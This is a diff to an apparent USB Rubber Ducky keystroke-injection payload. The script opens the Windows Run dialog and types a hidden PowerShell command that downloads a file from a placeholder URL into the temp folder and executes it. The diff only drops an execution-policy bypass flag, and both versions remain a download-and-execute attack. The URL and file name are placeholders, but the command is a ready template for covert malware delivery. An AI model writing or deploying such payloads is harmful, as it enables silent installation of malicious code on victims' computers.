@@ -1,5 +1,5 @@
 DELAY 750
 GUI r
 DELAY 100
-STRING powershell -ExecutionPolicy Bypass -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('[URL]', '%temp%/[NAME]'); %temp%/[NAME]
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('[URL]', '%temp%/[NAME]'); %temp%/[NAME]
 ENTER
